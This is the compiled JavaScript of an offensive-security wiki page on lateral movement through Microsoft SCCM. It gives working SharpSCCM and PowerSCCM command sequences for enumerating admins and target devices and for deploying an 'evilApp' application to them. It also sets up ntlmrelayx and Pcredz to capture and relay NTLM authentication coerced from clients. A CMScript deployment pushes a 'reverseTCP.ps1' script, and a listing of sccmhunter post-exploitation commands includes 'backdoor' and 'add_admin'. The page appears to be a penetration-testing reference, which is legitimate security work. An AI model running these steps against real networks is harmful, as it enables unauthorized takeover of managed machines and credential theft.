import{_ as p,c as k,a5 as h,G as a,w as t,j as i,a as s,B as r,o}from"./chunks/framework.B5CpDqM0.js";const c="/assets/SCCM_Lateral_Movement_User_Enum.Dqse7eVw.png",d="/assets/SCCM_Lateral_Movement_Special_Account_Enum.C0d0jIEu.png",g="/assets/SCCM_Lateral_Movement_Execution_Step3_Trigger_Deployment.Boq58p0C.png",y="/assets/SCCM_Lateral_Movement_Execution_Step3_Capture_Authentication.BQJmPBDD.png",b=JSON.parse('{"title":"Lateral movement","description":"","frontmatter":{"authors":"BlWasp, ShutdownRepo"},"headers":[],"relativePath":"ad/movement/sccm-mecm/lateral-movement.md","filePath":"ad/movement/sccm-mecm/lateral-movement.md","lastUpdated":1724982529000}'),m={name:"ad/movement/sccm-mecm/lateral-movement.md"};function u(C,e,E,F,v,A){const l=r("PluginTabsTab"),n=r("PluginTabs");return o(),k("div",null,[e[5]||(e[5]=h('<h1 id="lateral-movement" tabindex="-1">Lateral movement <a class="header-anchor" href="#lateral-movement" aria-label="Permalink to &quot;Lateral movement&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>Since the main goal of SCCM is to deploy applications and services on the managed assets of the Active Directory, it is also a pretty good candidate to move latteraly on the network. With administrative rights on the primary site server, this can be done by deploying applications and scripts on the targets or coercing clients&#39; authentication.</p><p>Additionnaly, SCCM permits to enumerate many data on the ressources. Among all the services offered by SCCM to the administrator, there is one named CMPivot. This service, located on the MP server, can enumerate all the resources of a computer or computer collection (installed software, local administrators, hardware specification, etc.), and perform administrative tasks on them. It uses a HTTP REST API, named AdminService, provided by the SMS Provider server.</p><p>Finally, as indicated by <a href="https://mobile.twitter.com/_mayyhem" target="_blank" rel="noreferrer">Chris Thompson</a> in his article <a href="https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087" target="_blank" rel="noreferrer">SCCM Hierarchy Takeover</a>, by default, when a new user is promoted to any SCCM administrative role on a primary site server (for example, <code>Full Administrator</code>), the role is automatically propagated to the other SCCM site in the hierarchy by the CAS.</p><p>This means that there is no security boundary between SCCM sites in a same hierarchy, and being able to takeover one SCCM site implicates to takeover all the others.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><h3 id="admin-special-account-enumeration" tabindex="-1">Admin &amp; Special Account Enumeration <a class="header-anchor" href="#admin-special-account-enumeration" aria-label="Permalink to &quot;Admin &amp; Special Account Enumeration&quot;">​</a></h3><p>This step requires administrative privileges over the SCCM Management Point (MP) in order to query the MP&#39;s WMI database.</p>',9)),a(n,null,{default:t(()=>[a(l,{label:"Windows"},{default:t(()=>e[0]||(e[0]=[i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Admin Users")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," get class"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"instances SMS_ADMIN")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Special Accounts")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," get class"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"instances SMS_SCI_Reserved")])])])],-1),i("p",null,[i("img",{src:c,alt:""})],-1),i("p",{class:"caption"},"Admin user enumeration in SCCM",-1),i("p",null,[i("img",{src:d,alt:""})],-1),i("p",{class:"caption"},"Special Account Enumeration in SCCM",-1)])),_:1})]),_:1}),e[6]||(e[6]=i("h3",{id:"applications-and-scripts-deployment",tabindex:"-1"},[s("Applications and scripts deployment "),i("a",{class:"header-anchor",href:"#applications-and-scripts-deployment","aria-label":'Permalink to "Applications and scripts deployment"'},"​")],-1)),a(n,null,{default:t(()=>[a(l,{label:"SharpSCCM"},{default:t(()=>e[1]||(e[1]=[i("p",null,"References:",-1),i("ul",null,[i("li",null,[i("a",{href:"https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867",target:"_blank",rel:"noreferrer"},"https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867")])],-1),i("p",null,[i("strong",null,"Step 1"),s(": Confirm Access permissions")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," get class"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"instances SMS_Admin "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"p CategoryNames "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"p CollectionNames "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"p LogonName "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"p RoleNames")])])])],-1),i("hr",null,null,-1),i("p",null,[i("strong",null,"Step 2"),s(": Find target device")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},'# Search for device of user "Frank.Zapper"')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," get primary"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"users "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"u Frank.Zapper")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# List all active SCCM devices where the SCCM client is installed ")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"### CAUTION: This could be huge")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," get devices "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"w "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"Active=1 and Client=1"')])])])],-1),i("hr",null,null,-1),i("p",null,[i("strong",null,"Step 3"),s(": Deploy Application to target device")],-1),i("p",null,"In this final step you can choose to either create an actual application to deploy to the target machine or just trigger an install from a remote UNC path in order to capture and relay an incoming NTLM authentication. Note the following:",-1),i("ul",null,[i("li",null,"Coercing an authentication might be stealthier (and requires less cleanup) than installing an application"),i("li",null,"To capture and relay NTLM credentials, the target device must support NTLM (very likely)."),i("li",null,"The neat part: The Authentication can be coerced using the primary user account of the device OR the device computer account (you can choose)")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Prep capturing server")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"## ntlmrelayx targeting 10.250.2.179")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ntlmrelayx.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -smb2support"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -socks"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ts"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ip"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 10.250.2.100"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 10.250.2.179")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Also keep Pcredz running, just in case")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Pcredz"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -i"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," enp0s8"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t")])])])],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Run the attack")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," exec "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"rid  "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"r")])])])],-1),i("p",null,"Note that the incoming authentication requsts might take a while (couple minutes) to roll in...",-1),i("p",null,[i("img",{src:g,alt:""})],-1),i("p",null,[i("img",{src:y,alt:""})],-1)])),_:1}),a(l,{label:"PowerSCCM"},{default:t(()=>e[2]||(e[2]=[i("p",null,[s("With sufficient rights on the central SCCM server (sufficient rights on WMI), it is possible to deploy applications or scripts on the Active Directory machines with "),i("a",{href:"https://github.com/PowerShellMafia/PowerSCCM",target:"_blank",rel:"noreferrer"},"PowerSCCM"),s(" (Powershell).")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Create a SCCM Session via WMI with the Site Code")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Find-SccmSiteCode"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ComputerName SCCMServer")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"New-SccmSession"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ComputerName SCCMServer "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"SiteCode  "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ConnectionType WMI")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Retrieve the computers linked to the SCCM server")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-SccmSession"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Get-SccmComputer")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Create a computer collection")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-SccmSession"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," New-SccmCollection"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"CollectionName "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"collection"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"CollectionType "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"Device"')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Add computers to the collection")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-SccmSession"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Add-SccmDeviceToCollection"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ComputerNameToAdd "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"target"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"CollectionName "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"collection"')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Create an application to deploy")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-SccmSession"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," New-SccmApplication"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ApplicationName "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"evilApp"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"PowerShellB64 "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'""')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Create an application deployment with the application and the collection previously created")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-SccmSession"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," New-SccmApplicationDeployment"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ApplicationName "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"evilApp"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"AssignmentName "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"assig"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"CollectionName "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"collection"')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Force the machine in the collection to check the application update (and force the install)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-SccmSession"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Invoke-SCCMDeviceCheckin"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"CollectionName "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"collection"')])])])],-1),i("p",null,'If deploying applications fails, deploying CMScripts is an alternative, which requires a "Configuration Manager" drive on the SCCM server.',-1),i("p",null,[s("This "),i("a",{href:"https://github.com/PowerShellMafia/PowerSCCM/pull/6",target:"_blank",rel:"noreferrer"},"pull request"),s(" on PowerSCCM can be used to do everything in one command. It uses the script "),i("code",null,"configurationmanager.psd1"),s(" created by Microsoft, usually installed on SCCM servers.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Create a CM drive if it doesn't already exist and deploy a CMScript on a target")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"New-CMScriptDeployement"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"CMDrive "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'E'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ServerFQDN "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'sccm.domain.local'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"TargetDevice "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'target'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Path "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'.\\reverseTCP.ps1'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ScriptName "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'evilScript'")])])])],-1)])),_:1})]),_:1}),e[7]||(e[7]=i("h3",{id:"adminservice-api",tabindex:"-1"},[s("AdminService API "),i("a",{class:"header-anchor",href:"#adminservice-api","aria-label":'Permalink to "AdminService API"'},"​")],-1)),e[8]||(e[8]=i("p",null,"It appears that, with SCCM administrative rights, it is possible to directly interact with the AdminService API, without using CMPivot, for post SCCM exploitation purpose.",-1)),a(n,null,{default:t(()=>[a(l,{label:"UNIX-like"},{default:t(()=>e[3]||(e[3]=[i("p",null,[s("From UNIX-like systems, "),i("a",{href:"https://github.com/garrettfoster13/sccmhunter",target:"_blank",rel:"noreferrer"},"sccmhunter"),s(" (Python) can be used for this purpose.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"sccmhunter.py"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," admin"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "site_server_IP"')])])])],-1),i("p",null,[s("Then, the "),i("code",null,"help"),s(" command can be typed in the opened shell to view all the CMPivot commands handled by "),i("a",{href:"https://github.com/garrettfoster13/sccmhunter",target:"_blank",rel:"noreferrer"},"sccmhunter"),s(".")],-1),i("div",{class:"language- vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"}),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",null,"() C:\\ >> help")]),s(`
`),i("span",{class:"line"},[i("span")]),s(`
`),i("span",{class:"line"},[i("span",null,"Documented commands (use 'help -v' for verbose/'help ' for details):")]),s(`
`),i("span",{class:"line"},[i("span")]),s(`
`),i("span",{class:"line"},[i("span",null,"Database Commands")]),s(`
`),i("span",{class:"line"},[i("span",null,"=================")]),s(`
`),i("span",{class:"line"},[i("span",null,"get_collection get_device get_lastlogon get_puser get_user")]),s(`
`),i("span",{class:"line"},[i("span")]),s(`
`),i("span",{class:"line"},[i("span",null,"Interface Commands")]),s(`
`),i("span",{class:"line"},[i("span",null,"==================")]),s(`
`),i("span",{class:"line"},[i("span",null,"exit interact")]),s(`
`),i("span",{class:"line"},[i("span")]),s(`
`),i("span",{class:"line"},[i("span",null,"PostEx Commands")]),s(`
`),i("span",{class:"line"},[i("span",null,"===============")]),s(`
`),i("span",{class:"line"},[i("span",null,"add_admin backdoor backup delete_admin restore script")]),s(`
`),i("span",{class:"line"},[i("span")]),s(`
`),i("span",{class:"line"},[i("span",null,"Situational Awareness Commands")]),s(`
`),i("span",{class:"line"},[i("span",null,"==============================")]),s(`
`),i("span",{class:"line"},[i("span",null,"administrators console_users ipconfig osinfo sessions")]),s(`
`),i("span",{class:"line"},[i("span",null,"cat disk list_disk ps shares ")]),s(`
`),i("span",{class:"line"},[i("span",null,"cd environment ls services software")])])])],-1)])),_:1}),a(l,{label:"Windows"},{default:t(()=>e[4]||(e[4]=[i("p",null,[s("From Windows systems, "),i("a",{href:"https://github.com/Mayyhem/SharpSCCM",target:"_blank",rel:"noreferrer"},"SharpSCCM"),s(" (C#) can be used for this purpose.")],-1),i("p",null,[i("strong",null,"Step 1"),s(": retrieve the ID of the resource to enumerate (a computer or a computer collection)")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," get resource"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"id "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"d "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"COMPUTER"')])])])],-1),i("hr",null,null,-1),i("p",null,[i("strong",null,"Step 2"),s(": execute administrative tasks with CMPivot requests")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Enumerate the local administrators")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," invoke admin"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"service "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"r  "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"q "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"Administrators"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"j")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Enumerate the installed softwares")]),s(`
